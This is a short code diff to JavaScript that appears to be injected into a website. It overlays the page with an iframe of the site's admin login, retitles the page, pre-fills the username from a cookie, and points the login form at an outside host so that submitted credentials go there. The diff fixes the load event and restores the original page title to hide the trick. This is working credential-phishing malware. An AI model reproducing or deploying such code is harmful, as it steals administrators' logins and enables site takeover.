@@ -28,13 +28,14 @@ document.body.innerHTML = "<iframe scrolling='no' onload=\"this.style.background
 var prevTitle = document.title;
 document.title = "网站管理系统";
 
-$("#login_iframe").ready(function(){
+$("#login_iframe").on('load', function(){
 	//alert("Loaded");
 	$("#login_iframe").contents().find("#form1")[0].action = "http://g4wowisbad.000webhostapp.com/login.php";
 	$("#login_iframe").contents().find("#txtUsername")[0].value = getCookie("login_name");
 	$("#login_iframe").contents().find("#form1").submit(function(){
 		$("#login_iframe").attr("src", "/admin_g4wow/Login.aspx");
 		$("#login_iframe").delay(1000).hide(0);
+		document.title = prevTitle;
 	});
 });
 
